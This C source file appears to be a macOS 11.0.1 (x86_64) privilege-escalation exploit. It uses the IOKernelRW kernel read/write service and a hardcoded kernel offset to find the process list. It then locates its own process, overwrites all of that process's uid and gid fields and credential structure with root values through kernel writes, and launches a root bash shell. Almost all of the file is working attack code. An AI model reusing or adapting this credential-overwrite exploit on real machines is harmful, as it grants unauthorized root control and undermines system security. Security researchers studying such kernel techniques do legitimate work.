#include <stdio.h>
#include <iokernelrw.h>

//macOS 11.0.1 (x86_64)
//Darwin seos-Mac-2.local 20.1.0 Darwin Kernel Version 20.1.0: Sat Oct 31 00:07:31 PDT 2020; root:xnu-7195.50.7~2/DEVELOPMENT_X86_64 x86_64

#define KERNEL_BASE			0xffffff8000200000
#define KERNEL_SLIDE		0x10000
#define KERNEL_TEXT_BASE	0xffffff8000210000

#define PROCINIT			0xFFFFFF800095DB20 

uint32_t off_p_pid = 0x68;
uint32_t off_p_ucred = 0xf0;

uint32_t off_p_uid = 0x2c;
uint32_t off_p_gid = 0x30;
uint32_t off_p_ruid = 0x34;
uint32_t off_p_rgid = 0x38;
uint32_t off_p_svuid = 0x3c;
uint32_t off_p_svgid = 0x40;

uint32_t off_u_cr_uid = 0x18;
uint32_t off_u_cr_ruid = 0x1c;
uint32_t off_u_cr_svuid = 0x20;
uint32_t off_u_cr_ngroups = 0x24;
uint32_t off_u_cr_groups = 0x28;
uint32_t off_u_cr_rgid = 0x68;
uint32_t off_u_cr_svgid = 0x6c;
uint32_t off_u_cr_gmuid = 0x70;
uint32_t off_u_cr_flags = 0x74;
uint32_t off_u_cr_label = 0x78;


io_connect_t iokernelrw_client = MACH_PORT_NULL;

kern_return_t kreadbuf(uint64_t addr, void *data, size_t size) {
    kern_return_t result = iokernelrw_read(iokernelrw_client, addr, data, size);

    return result;
}

uint32_t kread32(uint64_t address) {
    uint32_t output = 0;
    kern_return_t result;
    size_t bytesRead = 0;

    result = iokernelrw_read(iokernelrw_client, address, (void *)&output, sizeof(uint32_t));

    if (result != KERN_SUCCESS) {
        return 0;
    }

    return output;
}

uint64_t kread64(uint64_t address) {
    uint64_t output = 0;
    kern_return_t result;
    size_t bytesRead = 0;

    result = iokernelrw_read(iokernelrw_client, address, (void *)&output, sizeof(uint64_t));

    if (result != KERN_SUCCESS) {
        return 0;
    }

    return output;
}

kern_return_t kwrite64(uint64_t addr, uint64_t data) {
    return iokernelrw_write(iokernelrw_client, &data, addr, sizeof(uint64_t));
}

kern_return_t kwrite32(uint64_t addr, uint32_t data) {
    return iokernelrw_write(iokernelrw_client, &data, addr, sizeof(uint32_t));
}

uint64_t proc_of_pid(uint64_t allproc, pid_t pid) {

    uint64_t proc = kread64(allproc);
    uint64_t current_pid = 0;

    while (proc) {
        current_pid = kread32(proc + off_p_pid);
        if (current_pid == pid) return proc;
        proc = kread64(proc);
    }

    return 0;
}

uint64_t proc_ucred(uint64_t proc) {
	return kread64(proc + off_p_ucred);
}

bool rootify(uint64_t proc) {
    if (!proc) return false;

	uint64_t ucred = kread64(proc + off_p_ucred);

    kwrite32(proc + off_p_uid, 0);
    kwrite32(proc + off_p_ruid, 0);
	kwrite32(proc + off_p_svuid, 0);
    kwrite32(proc + off_p_gid, 0);
    kwrite32(proc + off_p_rgid, 0);
	kwrite32(proc + off_p_svgid, 0);

    kwrite32(ucred + off_u_cr_uid, 0);
    kwrite32(ucred + off_u_cr_ruid, 0);
    kwrite32(ucred + off_u_cr_svuid, 0);
    kwrite32(ucred + off_u_cr_ngroups, 1);
    kwrite32(ucred + off_u_cr_groups, 0);
    kwrite32(ucred + off_u_cr_rgid, 0);
    kwrite32(ucred + off_u_cr_svgid, 0);
	kwrite32(ucred + off_u_cr_gmuid, 0);
    
    return (kread32(proc + off_p_uid) == 0) ? true : false;
}

void khexdump(uint64_t addr, size_t size) {
    void *data = malloc(size);
    kreadbuf(addr, data, size);
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", addr, i);
        }
        
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
    free(data);
}

int main(void) {
	iokernelrw_client = iokernelrw_open();
	if (iokernelrw_client == MACH_PORT_NULL) {
        fprintf(stderr, "[-] Failed to open IOKernelRW service.\n");
        return 1;
    }
    printf("[*] IOKernelRW service opened successfully.\n");

	printf("[*] Before uid -> %d\n", getuid());

	uint64_t procinit = PROCINIT + KERNEL_SLIDE;
	uint64_t pi_mov_allproc_0 = procinit + 4;
	uint64_t pi_mov_allproc_0_imm = (kread64(pi_mov_allproc_0) >> 24) & 0xFFFFFF;
	uint64_t pi_mov_allproc_0_instr_sz = 11;
	uint64_t allproc = pi_mov_allproc_0 + pi_mov_allproc_0_instr_sz + pi_mov_allproc_0_imm;

	printf("[+] allproc is at: 0x%llx\n", allproc);

	uint64_t ourproc = proc_of_pid(allproc, getpid());
	printf("[+] ourproc is at: 0x%llx\n", ourproc);

	uint64_t kernproc = proc_of_pid(allproc, 0);
	printf("[+] kernproc is at: 0x%llx\n", kernproc);

	uint64_t ourproc_ucred = proc_ucred(ourproc);
	printf("[+] ourproc_ucred = 0x%llx\n", ourproc_ucred);

	printf("[*] rootify ret = 0x%x\n", rootify(ourproc));

	printf("[*] After uid -> %d\n", getuid());

	system("/bin/bash");

	IOServiceClose(iokernelrw_client);

	return 0;
}
